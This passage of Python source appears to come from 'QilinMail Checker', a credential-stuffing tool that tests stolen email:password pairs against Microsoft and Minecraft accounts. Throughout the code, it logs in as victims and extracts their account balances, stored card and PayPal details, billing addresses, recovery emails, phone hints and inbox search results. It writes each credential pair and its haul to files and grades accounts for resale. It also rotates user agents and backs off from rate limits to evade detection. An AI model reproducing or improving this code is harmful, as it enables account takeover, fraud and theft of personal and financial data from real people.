            _err  = s.get('errors', 0);      _mfa  = s.get('mfa', 0)
            _sfa  = s.get('sfa', 0);         _cpm  = s.get('cpm', 0)
            _ts   = s.get('tier_s', 0);      _ta   = s.get('tier_a', 0)
            _tb   = s.get('tier_b', 0);      _tc   = s.get('tier_c', 0)
            _og   = s.get('og_names', 0);    _cc   = s.get('cubecraft', 0)
            _lu   = s.get('lunar', 0);       _hyp  = s.get('hypixel', 0)
            _cape = s.get('capes_total', 0); _ofc  = s.get('optifine_capes', 0)
            _pay  = s.get('payment_methods', 0); _inb = s.get('inbox_matches', 0)
            _zqa  = s.get('zeqa', 0);        _bed  = s.get('bedrock', 0)
            _ess  = s.get('essential', 0);   _brc  = s.get('breach', 0)
            _rlm  = s.get('realms', 0);      _rar  = s.get('rare_names', 0)
            _mmen = s.get('minemen', 0);     _hive = s.get('hive', 0)
            _wynn = s.get('wynncraft', 0);   _lost = s.get('lost', 0)
            _nm   = s.get('name_changes', 0)

            pct     = chk / max(total, 1)
            filled  = int(40 * pct)
            B1 = '\x1b[32m'; B2 = '\x1b[37m'; B0 = '\x1b[0m'
            bar     = B1 + chr(9608) * filled + B2 + chr(9617) * (40 - filled) + B0
            elapsed = int(now - self.start_time) if getattr(self,'start_time',None) else 0
            h2, m2, s2 = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
            _eta   = calc_eta(chk, total, self.start_time) if getattr(self,'start_time',None) else '--:--:--'
            _hrate = (_hits / max(chk, 1)) * 100
            _speed = chk / max(elapsed, 1)

            C   = '\x1b[36m'; G = '\x1b[32m'; Y = '\x1b[33m'
            R   = '\x1b[31m'; M = '\x1b[35m'; BL = '\x1b[34m'
            W   = '\x1b[37m'; RS= '\x1b[0m';  DIM='\x1b[2m'; BLD='\x1b[1m'
            EL  = '\x1b[K'

            buf = [
                '\x1b[H',  # Sadece imleci basa al (titremeyi onler)
                f'{BLD}{C}  QilinMail Checker v0.8 {RS}| {DIM}Time: {h2:02d}:{m2:02d}:{s2:02d} | Speed: {_speed:.1f}/s{RS}{EL}',
                f'  {bar} {C}{pct*100:5.1f}%{RS} {W}[{Y}{chk:,}{W}/{total:,}]{RS} {BLD}{G}Hits:{_hits}{RS} {C}CPM:{_cpm}{RS} {Y}ETA:{_eta}{RS}{EL}',
                f'{C}  ════════════════════════════════════════════════════════════════════════════════════════{RS}{EL}',
                f'  {Y}[CHECKING] {RS} {G}Hits: {_hits:<4}{RS} | {R}Bad: {_bad:<4}{RS} | {Y}2FA: {_2fa:<4}{RS} | {BL}XGP: {_xgp:<4}{RS} | {M}XGPU: {_xgpu:<4}{RS} | {G}Mail: {_vm:<4}{RS}{EL}',
                f'             {M}MFA: {_mfa:<5}{RS} | {W}SFA: {_sfa:<4}{RS} | {R}Retries: {_ret:<2}{RS} | {R}Errors: {_err:<2}{RS} | {M}Other: {_oth:<3}{RS} | {DIM}Lost: {_lost:<4}{RS}{EL}',
                f'  {M}[TIERS]    {RS} {Y}S-Tier: {_ts:<2}{RS} | {R}A-Tier: {_ta:<2}{RS} | {C}B-Tier: {_tb:<2}{RS} | {W}C-Tier: {_tc:<2}{RS} | {M}OG: {_og:<4}{RS} | {Y}Rare: {_rar:<4}{RS}{EL}',
                f'  {G}[CAPES]    {RS} {G}Capes: {_cape:<3}{RS} | {C}OptiFine: {_ofc:<2}{RS} | {M}Essential: {_ess:<2}{RS}{EL}',
                f'  {BL}[SERVERS]  {RS} {BL}Hypixel: {_hyp:<2}{RS} | {G}Lunar: {_lu:<3}{RS} | {Y}CubeCraft: {_cc:<2}{RS} | {R}Minemen: {_mmen:<2}{RS} | {M}Hive: {_hive:<2}{RS}{EL}',
                f'             {G}Wynncraft: {_wynn:<1}{RS} | {C}Zeqa: {_zqa:<4}{RS} | {W}Bedrock: {_bed:<3}{RS} | {G}Realms: {_rlm:<3}{RS}{EL}',
                f'  {W}[ACCOUNT]  {RS} {G}Payment: {_pay:<2}{RS} | {M}Inbox: {_inb:<3}{RS} | {R}Breached: {_brc:<2}{RS} | {Y}NameChg: {_nm:<2}{RS}{EL}',
                f'{C}  ════════════════════════════════════════════════════════════════════════════════════════{RS}{EL}',
                f'{C}  [LIVE LOGS] {RS}{EL}'
            ]
            A = buf.append
            
            with self._lock:
                log_lines = list(self.logs[-7:])
            for ll in log_lines:
                _cl = ll[:116] if len(ll) > 116 else ll
                A(f'  {C}│{RS} {_cl}{EL}')
            for _ in range(max(0, 7 - len(log_lines))):
                A(f'  {C}│{RS}{EL}')
            
            A('\x1b[J')  # Ekranin geri kalanini temizle

            _out = getattr(self, '_real_stdout', sys.stdout)
            with self._stdout_lock:
                _out.write('\n'.join(buf) + '\n')
                _out.flush()
            self.log_initialized = True
        except Exception:
            pass
    def screen_ui_log(self):
        return self.show_ui_screen()
    def show_error_screen(self, error_msg):
        self.log_error(error_msg)
    def show_finished_screen(self, results_folder):
        self.clear_screen()
        elapsed = self._get_elapsed_time()
        banned_count = 0
        unbanned_count = 0
        try:
            banned_path = os.path.join(results_folder, 'Banned.txt')
            if os.path.exists(banned_path):
                with open(banned_path, 'r', encoding='utf-8', errors='ignore') as bf:
                    banned_count = sum((1 for _ in bf if _.strip()))
        except Exception:
            banned_count = 0
        try:
            unbanned_path = os.path.join(results_folder, 'Unbanned.txt')
            if os.path.exists(unbanned_path):
                with open(unbanned_path, 'r', encoding='utf-8', errors='ignore') as uf:
                    unbanned_count = sum((1 for _ in uf if _.strip()))
        except Exception:
            unbanned_count = 0
        _fname_base = os.path.basename(results_folder)
        _dup_count  = 0
        _report_path = None
        _zip_path    = None
        try: _dup_count = clean_duplicates_in_results(_fname_base)
        except: pass
        try: _report_path = generate_session_report(_fname_base, self.start_time, self.stats)
        except: pass
        try: _zip_path = auto_zip_results(_fname_base)
        except: pass
        print(f"\n{Fore.CYAN}{'═' * 83}")
        print(f'{Fore.GREEN} ✓ CHECKING COMPLETED! {Fore.RESET}')
        print(f"{Fore.CYAN}{'═' * 83}{Fore.RESET}\n")
        print(f'{Fore.WHITE}Time: {Fore.CYAN}{elapsed}{Fore.RESET}')
        print(f"{Fore.WHITE}Hits: {Fore.GREEN}{self.stats['hits']}{Fore.RESET}")
        print(f'{Fore.WHITE}Unbanned: {Fore.GREEN}{unbanned_count}{Fore.RESET}')
        print(f"{Fore.YELLOW}S-Tier  : {Fore.YELLOW}{self.stats.get('tier_s',0)}{Fore.RESET}")
        print(f"{Fore.RED}A-Tier  : {Fore.RED}{self.stats.get('tier_a',0)}{Fore.RESET}")
        print(f"{Fore.MAGENTA}OG Names: {Fore.MAGENTA}{self.stats.get('og_names',0)}{Fore.RESET}")
        print(f"{Fore.CYAN}Lost    : {Fore.CYAN}{self.stats.get('lost',0)}{Fore.RESET}")
        if _report_path: print(f'{Fore.CYAN}Report  : {_report_path}{Fore.RESET}')
        if _dup_count:   print(f'{Fore.WHITE}Deduped : {Fore.GREEN}{_dup_count} lines removed{Fore.RESET}')
        if _zip_path:    print(f'{Fore.CYAN}Zipped  : {_zip_path}{Fore.RESET}')
        try:
            if UI_ENABLED and ui: ui.print_live_stats_table()
        except: pass
        print(f'{Fore.WHITE}Banned: {Fore.RED}{banned_count}{Fore.RESET}')
        print(f"{Fore.WHITE}Xgp: {Fore.LIGHTBLUE_EX}{self.stats['xgp']}{Fore.RESET}")
        print(f"{Fore.WHITE}Xgpu: {Fore.LIGHTCYAN_EX}{self.stats['xgpu']}{Fore.RESET}")
        print(f"{Fore.WHITE}Sfa: {Fore.YELLOW}{self.stats['sfa']}{Fore.RESET}\n")
    def add_log(self, message, level='INFO'):
        if level not in ('HIT', 'ERROR', 'PAYMENT') and not (level == 'INFO' and message.startswith('Other:')):
            return
        with self._lock:
            C = '[36m'; G = '[32m'; Y = '[33m'
            R = '[31m'; M = '[35m'; RS= '[0m'; BLD='[1m'
            if level == 'HIT':
                log_entry = f'{BLD}{G}[HIT]{RS} {message}'
            elif level == 'PAYMENT':
                log_entry = f'{BLD}{M}[PAY]{RS} {message}'
            elif level == 'ERROR':
                log_entry = f'{R}[ERR]{RS} {message}'
            elif level == 'INFO':
                log_entry = f'{Y}[INF]{RS} {message}'
            else:
                log_entry = message
            self.logs.append(log_entry)
            if len(self.logs) > self.max_logs:
                self.logs = self.logs[-self.max_logs:]


    def log_hit_formatted(self, capture_obj, extra_stats=None, precomputed_line=None):
        try:
            elapsed_str = self._get_elapsed_time()
            time_part = f'[{elapsed_str}]'
            if capture_obj.banned and str(capture_obj.banned).startswith('[Error]'):
                status_part = '[Error]'
                color = Fore.YELLOW
            elif capture_obj.banned and capture_obj.banned != 'False':
                status_part = '[Banned]'
                color = Fore.RED
            elif capture_obj.banned == 'False':
                status_part = '[Unbanned]'
                color = Fore.GREEN
            else:
                status_part = '[Unknown]'
                color = Fore.YELLOW
            
            if capture_obj.hypixl and ('[' in capture_obj.hypixl or ']' in capture_obj.hypixl) and capture_obj.hypixl != 'N/A':
                color = Fore.CYAN
            tags_part = ''
            if capture_obj.type:
                type_upper = str(capture_obj.type).upper()
                if 'GAME PASS' in type_upper or 'XGP' in type_upper:
                    if 'ULTIMATE' in type_upper or 'XGPU' in type_upper:
                        tags_part += '[XGPU]'
                    else:
                        tags_part += '[XGP]'
                if 'MINECRAFT' in type_upper or 'MC' in type_upper:
                    tags_part += '[MC]'
            if not tags_part:
                tags_part = '[MC]'  
            if capture_obj.capes and capture_obj.capes != '':
                tags_part += f'[{capture_obj.capes}]'
            if capture_obj.cape and capture_obj.cape == 'Yes':
                tags_part += '[Optifine]'
            pwd = capture_obj.password
            if len(pwd) > 4:
                masked_pwd = pwd[:2] + '*' * (len(pwd) - 4) + pwd[-2:]
            else:
                masked_pwd = '*' * len(pwd)
            if capture_obj.hypixl and capture_obj.hypixl != 'N/A':
                user_display = capture_obj.hypixl
            else:
                user_display = capture_obj.name if capture_obj.name and capture_obj.name != 'N/A' else 'Unknown'
            account_part = f'{capture_obj.email}:{masked_pwd}:{user_display}'
            stats_parts = []
            if hasattr(capture_obj, 'bwstars') and capture_obj.bwstars:
                try:
                     val = int(str(capture_obj.bwstars).replace(',', '').strip())
                     if val > 0:
                         stats_parts.append(f'BW: {capture_obj.bwstars}')
                except:
                     if str(capture_obj.bwstars) != '0':
                         stats_parts.append(f'BW: {capture_obj.bwstars}')

            if hasattr(capture_obj, 'swstars') and capture_obj.swstars and (str(capture_obj.swstars) not in ('N/A', '', '0')):
                try:
                     val = int(str(capture_obj.swstars).replace(',', '').strip())
                     if val > 0:
                         stats_parts.append(f'SW: {capture_obj.swstars}')
                except:
                     stats_parts.append(f'SW: {capture_obj.swstars}')
            if hasattr(capture_obj, 'sbcoins') and capture_obj.sbcoins and (str(capture_obj.sbcoins) not in ('N/A', '', 'None')):
                stats_parts.append(f'Sb_Coins: {capture_obj.sbcoins}')
            if hasattr(capture_obj, 'sbnetworth') and capture_obj.sbnetworth and (str(capture_obj.sbnetworth) not in ('N/A', '', 'None')):
                stats_parts.append(f'Sb_Networth: {capture_obj.sbnetworth}')
            if hasattr(capture_obj, 'pitcoins') and capture_obj.pitcoins and (str(capture_obj.pitcoins) not in ('N/A', '', 'None')):
                stats_parts.append(f'Pit_Coins: {capture_obj.pitcoins}')
            
            stats_part = ''
            stats_part = ''
            if stats_parts:
                stats_part = ' [Hypixel: ' + ', '.join(stats_parts) + ']'
            elif extra_stats:
                clean_stats = extra_stats.strip(' |')
                stats_part = f' [Hypixel: {clean_stats}]'
            final_content = f'{time_part} {status_part}{tags_part} {account_part}{stats_part}'
            colored_line = f'{color}{final_content}{Style.RESET_ALL}'
            self.add_log(colored_line, 'HIT')
        except Exception:
            self.log_hit(getattr(capture_obj, 'email', ''), getattr(capture_obj, 'type', ''))
    def update_stats(self, **kwargs):
        for key, value in kwargs.items():
            if key in self.stats:
                self.stats[key] = value
    def increment_stat(self, stat_name, amount=1):
        if stat_name in self.stats:
            self.stats[stat_name] += amount
    def start_checking(self, total):
        self.start_time = time.time()
        self.stats['total'] = total
        self.add_log(f'Starting check on {total} accounts...', 'INFO')
        # stdout intercept — print() çağrılarını log'a yönlendir
        try:
            import sys as _sys
            if not isinstance(_sys.stdout, _UIStdoutCapture):
                self._real_stdout = _sys.stdout
                _sys.stdout = _UIStdoutCapture(self, _sys.stdout)
        except Exception:
            pass
    def stop_checking(self):
        """stdout'u geri yükle."""
        try:
            import sys as _sys
            if isinstance(_sys.stdout, _UIStdoutCapture):
                _sys.stdout = self._real_stdout
        except Exception:
            pass

    def log_hit(self, email, account_type):
        self.add_log(f'HIT: {email} | Type: {account_type}', 'HIT')
    def log_bad(self, email):
        return
    def log_2fa(self, email):
        return
    def log_payment(self, email, details):
        self.add_log(f'PAYMENT: {email} | {details}', 'PAYMENT')
    def log_error(self, message):
        self.add_log(message, 'ERROR')
        self.increment_stat('errors')
    def log_info(self, message):
        self.add_log(message, 'INFO')
    def calculate_cpm(self):
        if self.start_time and self.stats['checked'] > 0:
            elapsed = time.time() - self.start_time
            if elapsed > 0:
                self.stats['cpm'] = int(self.stats['checked'] / elapsed * 60)
    def _get_elapsed_time(self):
        if not self.start_time:
            return '00:00:00'
        elapsed = int(time.time() - self.start_time)
        hours = elapsed // 3600
        minutes = elapsed % 3600 // 60
        seconds = elapsed % 60
        return f'{hours:02d}:{minutes:02d}:{seconds:02d}'
    def _get_percentage(self, value, total):
        if total == 0:
            return '0.0%'
        return f'{value / total * 100:.1f}%'
    def _strip_ansi(self, text):
        return ANSI_ESCAPE.sub('', text)
ui = UIManager()
class MicrosoftChecker:
    def __init__(self, session, email, password, config, fname):
        self.session = session
        self.email = email
        self.password = password
        self.config = config
        self.fname = fname
        self._token_cache = {}
        self._token_cache_timeout = 300
    def get_auth_token(self, client_id, scope, redirect_uri):
        cache_key = f'{client_id}:{scope}:{redirect_uri}'
        if cache_key in self._token_cache:
            token_data = self._token_cache[cache_key]
            if time.time() - token_data['timestamp'] < self._token_cache_timeout:
                return token_data['token']
        _uas = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        ]
        for _attempt in range(3):
            try:
                _hdr = {'User-Agent': random.choice(_uas), 'Accept-Language': 'en-US,en;q=0.9'}
                auth_url = (f'https://login.live.com/oauth20_authorize.srf'
                    f'?client_id={client_id}&response_type=token'
                    f'&scope={scope}&redirect_uri={redirect_uri}&prompt=none&mkt=en-US')
                r = self.session.get(auth_url, headers=_hdr,
                    timeout=int(self.config.get('timeout', 10)), allow_redirects=True)
                token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
                if not token and 'access_token' in r.text:
                    _m = re.search(r'access_token=([^&"]+)', r.text)
                    if _m: token = _m.group(1)
                if token:
                    self._token_cache[cache_key] = {'token': token, 'timestamp': time.time()}
                    return token
                if r.status_code == 429 or 'RateLimiter' in r.text:
                    time.sleep(random.uniform(1.0, 3.0) * (_attempt + 1))
                    continue
                return None
            except (requests.RequestException, TimeoutError, ConnectionError):
                time.sleep(random.uniform(0.3, 1.0))
        return None
    def _get_balance_token(self):
        for _cid,_sc,_rd in [
            ('000000000004773A','PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete','https://account.microsoft.com/auth/complete-silent-delegate-auth'),
            ('000000000004773A','PIFD.Read','https://account.microsoft.com/auth/complete-silent-delegate-auth'),
            ('00000000402B5328','PIFD.Read','https://login.live.com/oauth20_desktop.srf'),
        ]:
            try:
                t=self.get_auth_token(_cid,_sc,_rd)
                if t: return t
            except: continue
        return None

    def check_balance(self):
        try:
            token=self._get_balance_token()
            if not token: return None
            _msh={'Authorization':f'MSADELEGATE1.0={token}','Accept':'application/json',
                  'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
                  'ms-cv':'FbMBcD6byLL1mn4WNuGH.2','Origin':'https://account.microsoft.com',
                  'Referer':'https://account.microsoft.com/'}
            for _att,_ep in enumerate([
                'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US',
                'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB',
                'https://paymentinstruments.mp.microsoft.com/v7.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US',
            ]):
                try:
                    r=self.session.get(_ep,headers=_msh,timeout=15)
                    if r.status_code==200:
                        bm=re.search('"balance":(\\d+\\.?\\d*)',r.text)
                        if bm:
                            bal=bm.group(1); cm=re.search('"currency":"([A-Z]{3})"',r.text)
                            cur=cm.group(1) if cm else 'USD'
                            if float(bal)>0: return f'{bal} {cur}'
                        return '0.00 USD'
                    elif r.status_code==401:
                        self._token_cache.clear(); token=self._get_balance_token()
                        if token: _msh['Authorization']=f'MSADELEGATE1.0={token}'
                    elif r.status_code==429: time.sleep(random.uniform(1.5,3.5)*(_att+1))
                except: time.sleep(0.5)
            try:
                r2=self.session.get('https://account.microsoft.com/billing/payments',
                    headers={'User-Agent':_msh['User-Agent']},timeout=12)
                bm2=re.search('"balance":\\s*(\\d+\\.?\\d*)',r2.text)
                if bm2 and float(bm2.group(1))>0:
                    cm2=re.search('"currency":\\s*"([A-Z]{3})"',r2.text)
                    return f'{bm2.group(1)} {cm2.group(1) if cm2 else "USD"}'
            except: pass
            return None
        except (requests.RequestException,TimeoutError,ConnectionError,json.JSONDecodeError): return None
    def check_rewards_points(self):
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Pragma': 'no-cache', 'Accept': '*/*'}
            r = self.session.get('https://rewards.bing.com/', headers=headers, timeout=int(self.config.get('timeout', 10)))
            if 'action="https://rewards.bing.com/signin-oidc"' in r.text or 'id="fmHF"' in r.text:
                action_match = re.search('action="([^"]+)"', r.text)
                if action_match:
                    action_url = action_match.group(1)
                    data = {}
                    for input_match in re.finditer('<input type="hidden" name="([^"]+)" id="[^"]+" value="([^"]+)">', r.text):
                        data[input_match.group(1)] = input_match.group(2)
                    r = self.session.post(action_url, data=data, headers=headers, timeout=int(self.config.get('timeout', 10)))
            all_matches = re.findall(',"availablePoints":(\\d+)', r.text)
            if all_matches:
                points = max(all_matches, key=int)
                if points != '0':
                    return points
            headers_home = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Referer': 'https://www.bing.com/', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'}
            self.session.get('https://www.bing.com/', headers=headers_home, timeout=_safe_t(10))
            ts = int(time.time() * 1000)
            flyout_url = f'https://www.bing.com/rewards/panelflyout/getuserinfo?timestamp={ts}'
            headers_flyout = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Accept-Encoding': 'identity', 'Referer': 'https://www.bing.com/', 'X-Requested-With': 'XMLHttpRequest'}
            r_flyout = self.session.get(flyout_url, headers=headers_flyout, timeout=_safe_t(10))
            if r_flyout.status_code == 200:
                try:
                    data = r_flyout.json()
                    if data.get('userInfo', {}).get('isRewardsUser'):
                        balance = data.get('userInfo', {}).get('balance')
                        return str(balance)
                except ValueError:
                    pass
            return None
        except Exception:
            return None
    def check_payment_instruments(self):
        try:
            token = self.get_auth_token('000000000004773A', 'PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete', 'https://account.microsoft.com/auth/complete-silent-delegate-auth')
            if not token:
                return []
            headers = {'Authorization': f'MSADELEGATE1.0={token}', 'Accept': 'application/json'}
            r = self.session.get('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB', headers=headers, timeout=_safe_t(10))
            instruments = []
            if r.status_code == 200:
                try:
                    data = r.json()
                    for item in data:
                        if 'paymentMethod' in item:
                            pm = item['paymentMethod']
                            family = pm.get('paymentMethodFamily')
                            type_ = pm.get('paymentMethodType')
                            if family == 'credit_card':
                                last4 = pm.get('lastFourDigits', 'N/A')
                                expiry = f"{pm.get('expiryMonth', '')}/{pm.get('expiryYear', '')}"
                                instruments.append(f'CC: {type_} *{last4} ({expiry})')
                            elif family == 'paypal':
                                email = pm.get('email', 'N/A')
                                instruments.append(f'PayPal: {email}')
                except:
                    pass
            return instruments
        except Exception:
            return []
    def check_subscriptions(self):
        try:
            r = self.session.get('https://account.microsoft.com/services/api/subscriptions', timeout=_safe_t(10))
            subs = []
            if r.status_code == 200:
                try:
                    data = r.json()
                    for item in data:
                        if item.get('status') == 'Active':
                            name = item.get('productName', 'Unknown Subscription')
                            recurrence = item.get('recurrenceState', '')
                            subs.append(f'{name} ({recurrence})')
                except:
                    pass
            return subs
        except Exception:
            return []
    def check_billing_address(self):
        try:
            r = self.session.get('https://account.microsoft.com/billing/api/addresses', timeout=_safe_t(10))
            addresses = []
            if r.status_code == 200:
                try:
                    data = r.json()
                    for item in data:
                        line1 = item.get('line1', '')
                        city = item.get('city', '')
                        postal = item.get('postalCode', '')
                        country = item.get('country', '')
                        if line1:
                            addresses.append(f'{line1}, {city}, {postal}, {country}')
                except:
                    pass
            return addresses
        except Exception:
            return []


    def check_recovery_email(self):
        _ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'
        rec_email=None; phone_hint=None
        try:
            r=self.session.get('https://account.live.com/proofs/List',
                headers={'User-Agent':_ua,'Referer':'https://account.microsoft.com/'},timeout=12,allow_redirects=True)
            for _pat in [r'"DisplayEmail"\s*:\s*"([^"]+)"',r'data-proof-display="([^"]+)"',
                         r'alternateEmail["\ :]+([a-zA-Z0-9.*_%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})']:
                _m=re.search(_pat,r.text,re.IGNORECASE)
                if _m:
                    val=_m.group(1).strip()
                    if '@' in val and val.lower()!=self.email.lower(): rec_email=val; break
            _pm=re.search(r'(\+?[\d*\-\s]{7,20})',r.text)
            if _pm:
                cand=_pm.group(1).strip()
                if '*' in cand or len(re.sub(r'[^\d]','',cand))>=7: phone_hint=cand[:20]
        except: pass
        if not rec_email:
            try:
                _tok=self._get_balance_token()
                if _tok:
                    r2=self.session.get('https://account.microsoft.com/profile/security/api/getproofdata',
                        headers={'Authorization':f'MSADELEGATE1.0={_tok}','Accept':'application/json','User-Agent':_ua},timeout=10)
                    if r2.status_code==200:
                        for _p in [r'"display"\s*:\s*"([^"@]+@[^"]+)"',r'"alternateEmail"\s*:\s*"([^"]+)"']:
                            _m2=re.search(_p,r2.text,re.IGNORECASE)
                            if _m2:
                                val2=_m2.group(1).strip()
                                if val2 and val2.lower()!=self.email.lower(): rec_email=val2; break
            except: pass
        if not rec_email:
            try:
                r3=self.session.get('https://account.live.com/proofs/Manage/additional',
                    headers={'User-Agent':_ua},timeout=10)
                for hint in re.findall(r'[a-zA-Z0-9*][a-zA-Z0-9.*_%+\-]*@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}',r3.text):
                    if hint.lower()!=self.email.lower() and 'microsoft' not in hint.lower(): rec_email=hint; break
            except: pass
        return rec_email, phone_hint

    def check_inbox(self, keywords):
        try:
            scope = 'https://substrate.office.com/User-Internal.ReadWrite'
            token = self.get_auth_token('0000000048170EF2', scope, 'https://login.live.com/oauth20_desktop.srf')
            if not token:
                token = self.get_auth_token('0000000048170EF2', 'service::outlook.office.com::MBI_SSL', 'https://login.live.com/oauth20_desktop.srf')
            if not token:
                return []
            cid = self.session.cookies.get('MSPCID')
            if not cid:
                try:
                    self.session.get('https://outlook.live.com/owa/', timeout=_safe_t(10))
                    cid = self.session.cookies.get('MSPCID')
                except:
                    pass
            if not cid:
                cid = self.email
            headers = {'Authorization': f'Bearer {token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json', 'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json', 'Host': 'substrate.office.com'}
            results = []
            for keyword in keywords:
                try:
                    payload = {'Cvid': '7ef2720e-6e59-ee2b-a217-3a4f427ab0f7', 'Scenario': {'Name': 'owa.react'}, 'TimeZone': 'Egypt Standard Time', 'TextDecorations': 'Off', 'EntityRequests': [{'EntityType': 'Conversation', 'ContentSources': ['Exchange'], 'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}, {'Term': {'DistinguishedFolderName': 'DeletedItems'}}]}, 'From': 0, 'Query': {'QueryString': keyword}, 'RefiningQueries': None, 'Size': 25, 'Sort': [{'Field': 'Score', 'SortDirection': 'Desc', 'Count': 3}, {'Field': 'Time', 'SortDirection': 'Desc'}], 'EnableTopResults': True, 'TopResultsCount': 3}], 'AnswerEntityRequests': [{'Query': {'QueryString': keyword}, 'EntityTypes': ['Event', 'File'], 'From': 0, 'Size': 10, 'EnableAsyncResolution': True}], 'QueryAlterationOptions': {'EnableSuggestion': True, 'EnableAlteration': True, 'SupportedRecourseDisplayTypes': ['Suggestion', 'NoResultModification', 'NoResultFolderRefinerModification', 'NoRequeryModification', 'Modification']}, 'LogicalId': '446c567a-02d9-b739-b9ca-616e0d45905c'}
                    r = self.session.post('https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124', json=payload, headers=headers, timeout=_safe_t(10))
                    if r.status_code == 200:
                        data = r.json()
                        total = 0
                        if 'EntitySets' in data:
                            for entity_set in data['EntitySets']:
                                if 'ResultSets' in entity_set:
                                    for result_set in entity_set['ResultSets']:
                                        if 'Total' in result_set:
                                            total += result_set['Total']
                                        elif 'ResultCount' in result_set:
                                            total += result_set['ResultCount']
                                        elif 'Results' in result_set:
                                            total += len(result_set['Results'])
                        if total > 0:
                            results.append((keyword, total))
                except Exception:
                    pass
            return results
        except Exception:
            return []
def check_microsoft_account(session, email, password, config, fname):
    try:
        checker = MicrosoftChecker(session, email, password, config, fname)
        results = {}

        def check_balance():
            if config.get('check_microsoft_balance'):
                balance = checker.check_balance()
                if balance:
                    try:
                        amount_str = re.sub('[^\\d\\.]', '', str(balance))
                        if amount_str and float(amount_str) > 0:
                            write_dedupe(fname, 'Microsoft_Balance.txt', f'{email}:{password} | Balance: {balance}\n')
                            return ('balance', balance)
                    except Exception:
                        pass
            return None
        def check_rewards():
            if config.get('check_rewards_points', True):
                points = checker.check_rewards_points()
                if points:
                    write_dedupe(fname, 'Ms_Points.txt', f'{email}:{password} | Points: {points}\n')
                    return ('rewards_points', points)
            return None
        def check_payment():
            if config.get('check_payment_methods') or config.get('check_credit_cards') or config.get('check_paypal'):
                instruments = checker.check_payment_instruments()
                if instruments:
                    return ('payment_methods', instruments)
            return None
        def check_subs():
            if config.get('check_subscriptions'):
                subs = checker.check_subscriptions()
                if subs:
                    write_dedupe(fname, 'Subscriptions.txt', f"{email}:{password} | Subs: {', '.join(subs)}\n")
                    return ('subscriptions', subs)
            return None
        def check_orders():
            if config.get('check_orders') or config.get('check_purchase_history'):
                orders = checker.check_order_history()
                if orders:
                    block = f'{email}:{password}\n'
                    for order in orders:
                        block += f'  - {order}\n'
                    block += '----------------------------------------\n'
                    write_dedupe(fname, 'Order_History.txt', block)
                    return ('orders', orders)
            return None
        def check_billing():
            if config.get('check_billing_address'):
                addresses = checker.check_billing_address()
                if addresses:
                    write_dedupe(fname, 'Billing_Addresses.txt', f"{email}:{password} | Address: {'; '.join(addresses)}\n")
                    return ('billing_addresses', addresses)
            return None
        def check_recovery():
            re_, ph_ = checker.check_recovery_email()
            ret_={}
            if re_: ret_['recovery_email']=re_
            if ph_: ret_['ms_phone_hint']=ph_
            return ret_ if ret_ else None
        def check_inbox():
            if config.get('scan_inbox'):
                keywords_str = config.get('inbox_keywords', '')
                if keywords_str:
                    keywords = [k.strip() for k in keywords_str.split(',') if k.strip()]
                    inbox_results = checker.check_inbox(keywords)
                    if inbox_results:
                        formatted_results = ', '.join([f'{k} {v}' for k, v in inbox_results])
                        write_dedupe(fname, 'inboxes.txt', f'{email}:{password} | Inbox - {formatted_results}\n')
                        return ('inbox_results', inbox_results)
            return None

        funcs = [check_balance, check_rewards, check_payment, check_subs, check_orders, check_billing, check_inbox, check_recovery]
        with concurrent.futures.ThreadPoolExecutor(max_workers=len(funcs)) as executor:
            futures = [executor.submit(f) for f in funcs]
            for future in concurrent.futures.as_completed(futures):
                try:
                    res = future.result()
                    if res:
                        if isinstance(res, tuple):
                            results[res[0]] = res[1]
                        elif isinstance(res, dict):
                            results.update(res)
                except Exception:
                    pass
        return results
    except (OSError, IOError, PermissionError):
        return {'balance': None}
    except Exception:
        return {'balance': None}
class ConfigLoader:
    def __init__(self, config_file='config.ini'):
        self.config_file = config_file
        self.config = configparser.ConfigParser()
        self.settings = {}
        self._config_cache = None
        self._cache_timestamp = 0
        self._cache_timeout = 60
        self.load_config()
    def load_config(self):
        current_time = time.time()
        if self._config_cache is not None and current_time - self._cache_timestamp < self._cache_timeout and os.path.exists(self.config_file):
            self.settings = self._config_cache.copy()
            return True
        if not os.path.exists(self.config_file):
            self.create_default_config()
            return False
        try:
            self.config.read(self.config_file, encoding='utf-8')
            self.update_config_schema()
            self.parse_all_sections()
            self._config_cache = self.settings.copy()
            self._cache_timestamp = current_time
            return True
        except (configparser.Error, IOError, OSError):
            self.create_default_config()
            return False
    def create_default_config(self):
